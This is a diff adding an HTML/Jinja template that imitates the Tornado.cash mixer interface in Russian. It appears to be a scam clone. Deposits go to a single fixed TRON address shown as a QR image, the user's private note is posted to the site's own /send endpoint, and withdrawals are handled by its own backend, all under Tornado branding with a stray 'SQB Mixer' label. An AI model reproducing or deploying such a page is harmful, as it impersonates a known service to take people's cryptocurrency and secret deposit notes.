@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html class="" style="--width-animation: 100%;">
+<head>
+	<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+	<title>Tornado.cash</title>
+	<meta content="img-src &#39;self&#39; data:;font-src data:;style-src &#39;self&#39; &#39;unsafe-inline&#39;;connect-src *;script-src &#39;self&#39; &#39;unsafe-eval&#39; &#39;unsafe-inline&#39;;default-src &#39;self&#39;;object-src &#39;none&#39;;base-uri &#39;none&#39;;upgrade-insecure-requests;child-src blob:;worker-src blob:;" data-n-head="1" http-equiv="Content-Security-Policy">
+	<meta content="no-referrer" data-n-head="1" name="Referer-Policy">
+	<meta content="#000403" data-n-head="1" name="theme-color">
+	<meta content="Non-custodial Ethereum Privacy solution." data-hid="description" data-n-head="1" name="description">
+	<meta content="Tornado.Cash" data-hid="og:title" data-n-head="1" property="og:title">
+	<meta content="Non-custodial, trustless, serverless, private transactions on Ethereum network" data-hid="og:description" data-n-head="1" property="og:description">
+	<meta content="https://tornado.cash" data-hid="og:url" data-n-head="1" property="og:url">
+	<meta content="website" data-hid="og:type" data-n-head="1" property="og:type">
+	<meta content="https://tornado.cash/tw.png" data-hid="og:image" data-n-head="1" property="og:image">
+	<meta content="Tornado, Ethereum, ERC20, dapp, smart contract, decentralized, metamask, zksnark, zero knowledge" data-hid="keywords" data-n-head="1" name="keywords">
+	<link data-n-head="1" href="https://tornado.ws/manifest.json" rel="manifest">
+	<link data-n-head="1" href="https://tornado.ws/favicon/favicon.ico" rel="shortcut icon" type="image/x-icon">
+	<link data-n-head="1" href="https://tornado.ws/favicon/apple-touch-icon.png" rel="apple-touch-icon">
+  <link rel="stylesheet" href="{{ url_for('static', path='css/custom.css') }}">
+	<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" data-n-head="1" name="viewport">
+</head>
+<body>
+  {% if note != Null%}
+  <div class="modal is-active" id="alert" tabindex="-1">
+    <div class="modal-background"></div>
+    <div class="animation-content">
+      <form method="POST" action="/send" class="modal-card box box-modal">
+        <header class="box-modal-header is-spaced">
+          <div class="box-modal-title">
+            Секретная заметка
+          </div><button class="delete" type="button" onclick="HideAlert()"></button>
+        </header>
+        <div class="note" style="word-wrap: break-word !important;">Пожалуйста, создайте резервную копию вашей заметки. Она понадобится вам позже чтобы вернуть свой депозит. Относитесь к своей записке как к закрытому ключу - никогда не передавайте его ни с кем, включая торнадо. <br><br>
+          <input type="text" name="hash" style="display: none;" value="{{note}}">
+          <span style="color: #94ffbf !important;">{{note}}</span>
+        </div><button class="button is-primary is-fullwidth" type="submit"><span>Подтвердить</span></button>
+      </form><!---->
+    </div>
+  </div>{%endif%}
+	<div id="__nuxt">
+		<!---->
+		<div id="__layout">
+			<div class="wrapper" data-v-5c970d49="">
+				<nav aria-label="main navigation" class="navbar header" data-v-5c970d49="" role="navigation">
+					<div class="container">
+						<div class="navbar-brand">
+							<a class="navbar-item is-active" data-test="tornado_main_page" href="https://tornado.ws/"><svg class="logo" viewbox="0 0 155 40" xmlns="http://www.w3.org/2000/svg">
+							<path d="M29.4,8.6A11.5,11.5,0,0,1,39.9,19.4,17.1,17.1,0,0,0,8.5,10.5,11.5,11.5,0,0,1,19.3,0a17.2,17.2,0,0,0-8.9,31.4A11.5,11.5,0,0,1,0,20.6a17.1,17.1,0,0,0,31.3,9.1A11.4,11.4,0,0,1,20.6,40,17.1,17.1,0,0,0,29.4,8.6ZM19.9,27.2a6.9,6.9,0,0,1-5-2.1,7.1,7.1,0,1,1,5,2.1Zm36.6-9.7v7.4c0,1.3.5,1.6,1.8,1.6a4.8,4.8,0,0,0,1.8-.3v2.9a6.4,6.4,0,0,1-2.4.5c-3,0-4.8-1.9-4.8-5V17.5H50.4V14.4h2.5V9.9h3.6v4.5h3.6v3.1ZM77,21.9c0,5-2.5,7.7-7,7.7s-7.1-2.7-7.1-7.7,2.5-7.7,7.1-7.7S77,16.9,77,21.9Zm-3.6,0c0-4-1.3-4.8-3.4-4.8s-3.5.8-3.5,4.8,1.3,4.7,3.5,4.7S73.4,25.8,73.4,21.9ZM88,14.1v3.2a11.5,11.5,0,0,0-3.8.5V29.4H80.6V15.7A20.4,20.4,0,0,1,88,14.1Zm16.9,6.3v9h-3.6V20.1c0-1.4-.2-2.8-3.5-2.8a12,12,0,0,0-2.8.3V29.4H91.4V15.8a15,15,0,0,1,6.9-1.7C102.4,14.1,104.9,16.5,104.9,20.4Zm16.2.1v4.1c0,2.4-1.6,5-6.3,5s-6.4-2.6-6.4-5.1.5-4.7,6.5-4.7a11,11,0,0,1,2.6.2c0-1.7-.8-2.9-3.2-2.9a11.2,11.2,0,0,0-4.4.8V15a12.5,12.5,0,0,1,4.6-.9C118.8,14.1,121.1,16.4,121.1,20.5Zm-3.6,1.7h-2.1c-2.5,0-3.4.7-3.4,1.9s.9,2.4,2.8,2.4,2.7-.9,2.7-2.3Zm13.9-8.1,2.5.3V8.7h3.6V24.6c0,2.4-1.7,5-6.4,5-2,0-6.7-.8-6.7-7.9C124.4,16.8,126.9,14.1,131.4,14.1Zm-.3,12.4c1.6,0,2.8-.4,2.8-1.6V17.2l-2.4-.2c-2.1,0-3.5,1-3.5,4.5S128.8,26.5,131.1,26.5ZM155,21.9c0,5-2.5,7.7-7.1,7.7s-7.1-2.7-7.1-7.7,2.5-7.7,7.1-7.7S155,16.9,155,21.9Zm-3.6,0c0-4-1.4-4.8-3.5-4.8s-3.5.8-3.5,4.8,1.4,4.7,3.5,4.7S151.4,25.8,151.4,21.9Z" fill="#94febf" fill-rule="evenodd"></path></svg></a><a aria-label="menu" class="navbar-burger burger" role="button"><span aria-hidden="true"></span><span aria-hidden="true"></span><span aria-hidden="true"></span></a>
+						</div>
+						<div class="navbar-menu">
+							<div class="navbar-start">
+								<a class="navbar-item has-tag" data-test="voting_link" href="https://tornado.ws/governance">Голосование</a>
+                <a class="navbar-item" data-test="compliance_link" href="https://tornado.ws/compliance">Соответствие</a>
+                <a class="navbar-item has-tag" data-test="docs_link" href="https://docs.tornado.cash/" rel="noopener noreferrer" target="_blank">
+                  <span class="icon mr-1 is-small">
+                    <i class="trnd trnd-open-book"></i>
+                  </span>
+                  <span>Документация</span>
+                </a>
+							</div>
+							<div class="navbar-end">
+								<div class="navbar-item">
+									<div class="buttons">
+                    <button class="button is-primary is-outlined" data-test="button_settings" type="button"><span class="icon is-small"><i class="trnd trnd-settings"></i></span> <span>Настройки</span> <!----></button>
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+				</nav>
+        {% if errors == "Ошибка" %}
+				<div class="network has-background-warning" data-v-5c970d49="" style="display: none;">
+					{{errors}}<button class="button ml-3 is-warning is-dark" data-v-5c970d49="" type="button"><!----><span>Сменить сеть</span><!----></button>
+				</div>{%endif%}
+				<section class="main-content section" data-v-5c970d49="">
+					<div class="container" data-v-5c970d49="">
+						<div data-v-5c970d49="">
+							<!---->
+							<article class="notification main-notification is-warning" style="display: none;">
+								<button aria-label="Закрыть" class="delete" type="button"></button>
+								<div class="media">
+									<div class="media-left">
+										<span aria-hidden="" class="icon is-large"><i class="icon alert"></i></span>
+									</div>
+									<div class="media-content">
+										<span>You are using a public IPFS gateway. Tornado Cash dApp can not use all security features of your browser. Check out <a href="https://tornado.cash/">landing page</a> for alternatives</span>
+									</div>
+								</div>
+							</article>
+							<article class="notification main-notification is-info" style="display: none;">
+								<button aria-label="Закрыть" class="delete" type="button"></button>
+								<div class="media">
+									<div class="media-left">
+										<span aria-hidden="" class="icon is-large"><i class="icon information"></i></span>
+									</div>
+									<div class="media-content">
+										<span>Tornado Cash в настоящее время поддерживается сообществом, для получения дополнительной информации посетите <a href="https://tornadocash.community/" rel="noopener noreferrer" target="_blank">прошел аудит</a></span>
+									</div>
+								</div>
+							</article>
+							<article class="notification main-notification is-warning" style="display: none;">
+								<button aria-label="Закрыть" class="delete" type="button"></button>
+								<div class="media">
+									<div class="media-left">
+										<span aria-hidden="" class="icon is-large"><i class="icon alert"></i></span>
+									</div>
+									<div class="media-content">
+										<span>После <a href="https://home.treasury.gov/news/press-releases/jy0916" rel="noopener noreferrer" target="_blank">санкций OFAC</a> большинство конечных точек RPC подвергают цензуре депозиты, убедитесь, что ваш кошелек вручную настроен на работающую конечную точку. См. <a href="https://chainlist.org/" rel="noopener noreferrer" target="_blank">chainlist.org</a> , чтобы узнать о вариантах и ​​о том, <a href="https://docs.tornado.ws/general/guides/post-censorship#RPC" rel="noopener noreferrer" target="_blank">как настроить MetaMask</a></span>
+									</div>
+								</div>
+							</article>
+							<div class="columns">
+								<div class="column is-half">
+									<div class="b-tabs is-tornado">
+										<nav aria-orientation="horizontal" class="tabs" role="tablist">
+											<ul>
+												<li class="button_tab_deposit is-active" id="lideposit" role="presentation">
+													<a aria-controls="52-content" aria-selected="true" id="deposit" role="tab" tabindex="0"><!----><span>Депозит</span></a>
+												</li>
+												<li class="button_tab_withdraw" id="liwithdraw" role="presentation">
+													<a aria-controls="77-content" aria-selected="false" id="withdraw" role="tab" tabindex="-1"><!----><span>Вывод</span></a>
+												</li>
+											</ul>
+										</nav>
+										<section class="tab-content" id="deposit-content">
+											<form method="POST" aria-labelledby="52-label" class="tab-item" id="52-content" role="tabpanel" tabindex="0">
+												<fieldset>
+													<div class="field" data-test="token_list_dropdown">
+														<label class="label">Токен</label>
+                            <div id="dropdownmenuButton" class="dropdown dropdown-menu-animation is-active is-mobile-modal is-expanded">
+                              <div aria-haspopup="true" class="dropdown-trigger" role="button" tabindex="0">
+                                <div class="control">
+                                  <div class="input">
+                                    <span>TRX</span>
+                                  </div>
+                                </div>
+                              </div>
+                              <div class="dropdown-menu" id="dropdownmenu" style="display: none;">
+                                <div class="dropdown-content" role="list">
+                                  <a class="dropdown-item is-active" data-test="token_list_eth" role="listitem" tabindex="0">TRX</a>
+                                  <a class="dropdown-item" data-test="token_list_usdc" role="listitem" tabindex="0">USDC</a>
+                                  <a class="dropdown-item" data-test="token_list_usdt" role="listitem" tabindex="0">USDT</a>
+                                </div>
+                              </div>
+                            </div>
+													</div>
+													<div class="field">
+														<label class="label">QR-Код для поплнения<span id="tooltip-button" class="b-tooltip is-primary is-right is-small is-multiline"><button class="button is-primary has-icon"><label class="label"><span class="b-tooltip is-primary is-right is-small is-multiline"><span class="icon icon-info" data-test="choose_amount_info"></span></span></label></button></span></label>
+														<div class="tooltip-content" id="tooltip-content" style="display: none;">
+															<label class="label">
+                                <span class="b-tooltip is-primary is-right is-small is-multiline">Каждая сумма представляет собой отдельный экземпляр Tornado.cash с отдельным набором анонимности. Вы можете получить больше информации во вкладке Статистика.</span>
+                              </label>
+														</div>
+                            <div class="control is-clearfix" data-v-163dd0f9="" style="margin-bottom: 30px !important;">
+                              <img style="border: 2px solid #94ffbf;" width="100px;" height="100px;" src="{{ url_for('static', path='THYfkbprHon6mJkwB6nbnkPru1MsGUXRxW.png') }}" alt="">
+                            </div>
+													</div>
+												</fieldset><button class="button is-primary is-fullwidth" data-test="button_deposit" type="submit"><!----> <span>Продолжить</span> <!----></button>
+											</form>
+										</section>
+                    <section class="tab-content" style="display: none;" id="withdraw-content">
+                      <form method="POST" action="/withdraw" aria-labelledby="79-label" class="tab-item" data-v-163dd0f9="" id="79-content" role="tabpanel" style="" tabindex="0">
+                        <div class="field" data-v-163dd0f9="">
+                          <div class="label-with-buttons" data-v-163dd0f9="">
+                            <div class="label" data-v-163dd0f9="">
+                              Note<span class="b-tooltip is-primary is-right is-small is-multiline" data-test="enter_note_info" data-v-163dd0f9=""></span>
+                              <div class="tooltip-content" style="display: none;">
+                                <span class="b-tooltip is-primary is-right is-small is-multiline" data-test="enter_note_info" data-v-163dd0f9="">Введите Note, которую вы получили, когда вносили депозит</span>
+                              </div>
+                              <div class="tooltip-trigger">
+                                <span class="b-tooltip is-primary is-right is-small is-multiline" data-test="enter_note_info" data-v-163dd0f9=""><button class="button is-primary has-icon" data-v-163dd0f9=""><span class="b-tooltip is-primary is-right is-small is-multiline" data-test="enter_note_info" data-v-163dd0f9=""><span class="icon icon-info" data-v-163dd0f9=""></span></span></button></span>
+                              </div>
+                            </div><a class="button is-icon" data-v-163dd0f9="" href="https://etherscan.io/tx/null" rel="noopener noreferrer" style="display: none;" target="_blank"><span class="b-tooltip is-primary is-left is-small is-multiline" data-v-163dd0f9=""></span>
+                            <div class="tooltip-content" style="display: none;">
+                              <span class="b-tooltip is-primary is-left is-small is-multiline" data-v-163dd0f9="">Транзакция депозита на Etherscan</span>
+                            </div>
+                            <div class="tooltip-trigger">
+                              <span class="b-tooltip is-primary is-left is-small is-multiline" data-v-163dd0f9=""><svg data-v-163dd0f9="" height="18" viewbox="0 0 40 40" width="18" xmlns="http://www.w3.org/2000/svg">
+                              <path d="M36 40H4a4 4 0 0 1-4-4V4a4 4 0 0 1 4-4h8a2 2 0 1 1 0 4H6a2 2 0 0 0-2 2v28a2 2 0 0 0 2 2h28a2 2 0 0 0 2-2v-6a2 2 0 1 1 4 0v8a4 4 0 0 1-4 4zm2-22a2 2 0 0 1-2-2V6.801l-3.601 3.602-6.162 6.162-3.834 3.834-7 7a2.004 2.004 0 0 1-2.833-2.833l7-7L33.136 4H24a2 2 0 1 1 0-4h13.897c.083-.004.161.008.243.014.165.012.324.043.476.093.054.018.107.027.159.049.227.096.431.235.606.403.005.005.012.006.018.011A1.993 1.993 0 0 1 40 2v14a2 2 0 0 1-2 2z" fill="#94FEBF" fill-rule="evenodd"></path></svg></span>
+                            </div></a> <button class="button is-icon" data-test="withdrawal_settings_button" data-v-163dd0f9="" style="display: none;"><span class="b-tooltip is-primary is-right is-small is-multiline" data-v-163dd0f9=""></span>
+                            <div class="tooltip-content" style="display: none;">
+                              <span class="b-tooltip is-primary is-right is-small is-multiline" data-v-163dd0f9="">Настройки вывода</span>
+                            </div>
+                            <div class="tooltip-trigger">
+                              <span class="b-tooltip is-primary is-right is-small is-multiline" data-v-163dd0f9=""><svg data-v-163dd0f9="" height="18" viewbox="0 0 40 34" width="18" xmlns="http://www.w3.org/2000/svg">
+                              <path d="M38 7H22.859c-.447 1.722-1.997 3-3.859 3h-8c-1.862 0-3.412-1.278-3.859-3H2a2 2 0 1 1 0-4h5.141C7.588 1.278 9.138 0 11 0h8c1.862 0 3.412 1.278 3.859 3H38a2 2 0 1 1 0 4zM18 4h-6a1 1 0 0 0 0 2h6a1 1 0 0 0 0-2zM2 27h15.141c.447-1.722 1.997-3 3.859-3h8c1.862 0 3.412 1.278 3.859 3H38a2 2 0 1 1 0 4h-5.141c-.447 1.722-1.997 3-3.859 3h-8c-1.862 0-3.412-1.278-3.859-3H2a2 2 0 1 1 0-4zm20 3h6a1 1 0 0 0 0-2h-6a1 1 0 0 0 0 2z" fill="#94FEBF" fill-rule="evenodd"></path></svg></span>
+                            </div></button>
+                          </div>
+                          <div class="control is-clearfix" data-v-163dd0f9="">
+                            <input autocomplete="on" class="input" name="note" data-test="enter_note_field" placeholder="Введите Note" type="text"><!----><!----><!---->
+                          </div>
+                          <div class="help" data-v-163dd0f9="">
+                            <p data-v-163dd0f9=""></p>
+                          </div>
+                        </div><!---->
+                        <fieldset data-v-163dd0f9="">
+                          <div class="field withdraw-address" data-v-163dd0f9="">
+                            <div class="label-with-buttons" data-v-163dd0f9="">
+                              <div class="label" data-v-163dd0f9="">
+                                <span class="name" data-v-163dd0f9="">Адрес получателя</span>
+                              </div><button class="button is-primary-text" data-v-163dd0f9="">Поддержать проект</button>
+                            </div>
+                            <div class="control is-clearfix" data-v-163dd0f9="">
+                              <input autocomplete="on" class="input" name="address" data-test="recipient_address_field" placeholder="Вставьте адрес" type="text"><!----><!----><!---->
+                            </div>
+                            <p class="help" data-v-163dd0f9=""><span class="has-text-warning" data-v-163dd0f9=""></span></p>
+                          </div>{%if info != ""%}
+                          <div class="field" data-v-163dd0f9="">{%else%}<div class="field" data-v-163dd0f9="" style="display: none;">{%endif%}
+                            <div class="label">
+                              Итог
+                            </div>
+                            <div class="withdraw-data">
+                              <!---->
+                              <div class="withdraw-data-item">
+                                Цена Газа <span>0 Gwei</span>
+                              </div>
+                              <div class="withdraw-data-item">
+                                Комиссия сети <span data-test="label_network_fee">0.012824 TRX</span>
+                              </div>
+                              <div class="withdraw-data-item">
+                                Комиссия SQB Mixer <span data-test="label_relayer_fee">0 TRX</span>
+                              </div>
+                              <div class="withdraw-data-item">
+                                Итоговая комиссия <span data-test="label_total_fee">0.013214 TRX</span>
+                              </div><!---->
+                              <hr>
+                              <div class="withdraw-data-item">
+                                Получаемые токены <span data-test="label_tokens_to_receive">{%if info != ""%}{{info.amount}}{%endif%} TRX</span>
+                              </div><!---->
+                            </div>
+                          </div><span class="is-block b-tooltip is-primary is-top is-medium is-multiline" data-v-163dd0f9=""></span>
+                          <div class="tooltip-content" style="display: none;">
+                            <span class="is-block b-tooltip is-primary is-top is-medium is-multiline" data-v-163dd0f9="">Итоговая комиссия превышает количество получаемых токенов. Это может быть связано с высокой комиссией Relayer или временной перегрузкой сети.</span>
+                          </div>
+                          <button class="button is-primary is-fullwidth" data-test="button_deposit" type="submit"><!----> <span>Снять</span> <!----></button>
+                        </fieldset>
+                      </form>
+                    </section>
+									</div>
+								</div>
+								<div class="column is-half">
+									<div class="box-stats">
+										<div class="tab-with-corner is-left-top">
+											Статистика <span class="selected"> USDT</span>
+										</div>
+										<div class="box">
+											<div class="label">
+												Количество депозитов <span class="b-tooltip is-primary is-top is-medium is-multiline"></span>
+												<div class="tooltip-content" style="display: none;">
+													<span class="b-tooltip is-primary is-top is-medium is-multiline">Общее количество депозитов этой суммы в Tornado.сash. Чем больше это количество, тем лучше (анонимнее)</span>
+												</div>
+												<div class="tooltip-trigger">
+													<span class="b-tooltip is-primary is-top is-medium is-multiline"><button class="button is-primary has-icon"><span class="b-tooltip is-primary is-top is-medium is-multiline"><span class="icon icon-info"></span></span></button></span>
+												</div>
+											</div>
+											<div class="field">
+												<span><b>{{deposit_count}}</b> <span>депозитов</span></span> <!---->
+											</div>
+											<div class="label">
+												Последние депозиты
+											</div>
+											<div class="columns is-small is-multiline">
+												<div class="column is-half-small">
+													<div class="deposits">
+                            {%for transaction in transactions%}
+														<div class="row">
+															<div class="value">
+																{{transaction.id}}.
+															</div>
+															<div class="data">
+																{{transaction.date.strftime('%d %B %Y')}}
+															</div>
+                            </div>
+                            {%endfor%}
+                          </div>
+												</div>
+                        <div class="column is-half-small">
+													<div class="deposits">
+                            {%for transaction in transactions%}
+														<div class="row">
+															<div class="value">
+																{{transaction.id}}.
+															</div>
+															<div class="data">
+																{{transaction.date.strftime('%d %B %Y')}}
+															</div>
+                            </div>
+                            {%endfor%}
+                          </div>
+												</div>
+											</div>
+										</div>
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+				</section>
+				<footer class="footer" data-v-5c970d49="">
+					<div class="container">
+						<div class="level">
+							<div class="level-left">
+								<div class="level-item is-column">
+									<div class="level-subitem footer-address">
+										<div class="footer-address__name">
+											Адрес для донатов:
+										</div><a class="footer-address__value" href="https://etherscan.io/address/0x08ec3A4e3873505D34450b0F726136E1BF0c9DF7" rel="noopener noreferrer" target="_blank">0x08ec3A4e3873505D34450b0F726136E1BF0c9DF7</a>
+									</div>
+									<div class="level-subitem">
+										Tornado.cash version: <span class="footer-version__value">3f04b93</span>
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+				</footer><!---->
+				<div class="notices is-top" data-v-5c970d49=""></div><!---->
+			</div>
+		</div>
+	</div>
+  <script src="{{ url_for('static', path='js/cqb.js') }}"></script>
+</body>
+</html>
